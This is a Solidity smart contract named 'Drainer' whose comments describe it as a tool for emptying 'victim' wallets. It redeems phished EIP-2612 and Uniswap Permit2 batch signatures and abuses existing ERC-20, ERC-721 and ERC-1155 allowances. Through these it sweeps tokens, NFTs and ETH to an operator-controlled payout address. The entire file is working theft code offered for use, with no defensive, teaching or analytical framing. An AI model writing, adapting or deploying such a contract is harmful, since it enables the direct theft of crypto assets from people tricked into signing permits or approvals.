// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IERC2612 {
    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)
        external;
}

interface IERC721 {
    function transferFrom(address from, address to, uint256 id) external;
}

interface IERC1155 {
    function safeTransferFrom(address from, address to, uint256 id, uint256 amount, bytes calldata data) external;
}

/// @dev Uniswap Permit2 allowance-transfer surface (0x000000000022D473030F116dDEE9F6B43aC78BA3).
interface IPermit2 {
    struct PermitDetails {
        address token;
        uint160 amount;
        uint48 expiration;
        uint48 nonce;
    }

    struct PermitBatch {
        PermitDetails[] details;
        address spender;
        uint256 sigDeadline;
    }

    function permit(address owner, PermitBatch calldata batch, bytes calldata signature) external;
    function transferFrom(address from, address to, uint160 amount, address token) external;
    function allowance(address owner, address token, address spender)
        external
        view
        returns (uint160 amount, uint48 expiration, uint48 nonce);
}

/// @title Drainer
/// @notice Single spender contract for the three ways into a victim wallet:
///         1. EIP-2612 permit signature (gasless for the victim)
///         2. Uniswap Permit2 batch signature (gasless, covers every approved token at once)
///         3. pre-existing ERC-20/721/1155 allowances
///         Payouts always go to `payout`, never stay in the contract.
contract Drainer {
    address public constant PERMIT2 = 0x000000000022D473030F116dDEE9F6B43aC78BA3;

    address public immutable operator;
    address public payout;

    event Swept(address indexed owner, address indexed token, uint256 amount);
    event SweptNFT(address indexed owner, address indexed collection, uint256 id, uint256 amount);

    error NotOperator();
    error Expired();
    error BadSignature();

    modifier onlyOperator() {
        if (msg.sender != operator) revert NotOperator();
        _;
    }

    constructor() {
        operator = msg.sender;
        payout = msg.sender;
    }

    receive() external payable {}

    function setPayout(address newPayout) external onlyOperator {
        payout = newPayout;
    }

    // ------------------------------------------------------------------ 2612

    /// @notice Pulls funds with an EIP-2612 permit signed by `owner`.
    /// @param value Allowance to sign. Use type(uint256).max to sweep the full balance.
    function permit2612(
        address token,
        address owner,
        uint256 value,
        uint256 deadline,
        bytes calldata signature
    ) external onlyOperator {
        if (block.timestamp > deadline) revert Expired();
        (uint8 v, bytes32 r, bytes32 s) = _split(signature);

        IERC2612(token).permit(owner, address(this), value, deadline, v, r, s);

        uint256 amount = value == type(uint256).max ? IERC20(token).balanceOf(owner) : value;
        _safeTransferFrom(token, owner, amount);
        emit Swept(owner, token, amount);
    }

    // ----------------------------------------------------------------- permit2

    /// @notice Redeems a Permit2 PermitBatch signed by `owner`, then pulls every listed token.
    ///         `batch.spender` must be this contract.
    function permit2Batch(IPermit2.PermitBatch calldata batch, address owner, bytes calldata signature)
        external
        onlyOperator
    {
        IPermit2(PERMIT2).permit(owner, batch, signature);

        uint256 length = batch.details.length;
        for (uint256 i; i < length; ++i) {
            address token = batch.details[i].token;
            uint256 balance = IERC20(token).balanceOf(owner);
            if (balance == 0) continue;

            uint256 signed = batch.details[i].amount;
            uint256 amount = signed >= balance ? balance : signed;
            IPermit2(PERMIT2).transferFrom(owner, payout, uint160(amount), token);
            emit Swept(owner, token, amount);
        }
    }

    // ---------------------------------------------------------- existing allowances

    function pull(address token, address owner, uint256 amount) external onlyOperator {
        uint256 balance = IERC20(token).balanceOf(owner);
        if (amount == type(uint256).max || amount > balance) amount = balance;
        _safeTransferFrom(token, owner, amount);
        emit Swept(owner, token, amount);
    }

    function pullMany(address[] calldata tokens, address owner) external onlyOperator {
        for (uint256 i; i < tokens.length; ++i) {
            uint256 balance = IERC20(tokens[i]).balanceOf(owner);
            if (balance == 0) continue;
            _safeTransferFrom(tokens[i], owner, balance);
            emit Swept(owner, tokens[i], balance);
        }
    }

    function pull721(address collection, address owner, uint256[] calldata ids) external onlyOperator {
        for (uint256 i; i < ids.length; ++i) {
            IERC721(collection).transferFrom(owner, payout, ids[i]);
            emit SweptNFT(owner, collection, ids[i], 1);
        }
    }

    function pull1155(address collection, address owner, uint256[] calldata ids, uint256[] calldata amounts)
        external
        onlyOperator
    {
        for (uint256 i; i < ids.length; ++i) {
            IERC1155(collection).safeTransferFrom(owner, payout, ids[i], amounts[i], "");
            emit SweptNFT(owner, collection, ids[i], amounts[i]);
        }
    }

    function sweepETH() external onlyOperator {
        uint256 balance = address(this).balance;
        (bool ok,) = payout.call{value: balance}("");
        require(ok, "ETH transfer failed");
    }

    // ------------------------------------------------------------------ helpers

    function _safeTransferFrom(address token, address from, uint256 amount) private {
        (bool ok, bytes memory data) = token.call(abi.encodeCall(IERC20.transferFrom, (from, payout, amount)));
        if (!ok || (data.length != 0 && !abi.decode(data, (bool)))) revert BadSignature();
    }

    function _split(bytes calldata signature) private pure returns (uint8 v, bytes32 r, bytes32 s) {
        if (signature.length == 65) {
            assembly {
                r := calldataload(signature.offset)
                s := calldataload(add(signature.offset, 32))
                v := byte(0, calldataload(add(signature.offset, 64)))
            }
        } else if (signature.length == 64) {
            // EIP-2098 compact signature
            bytes32 vs;
            assembly {
                r := calldataload(signature.offset)
                vs := calldataload(add(signature.offset, 32))
                s := and(vs, 0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
                v := add(shr(255, vs), 27)
            }
        } else {
            revert BadSignature();
        }
    }
}
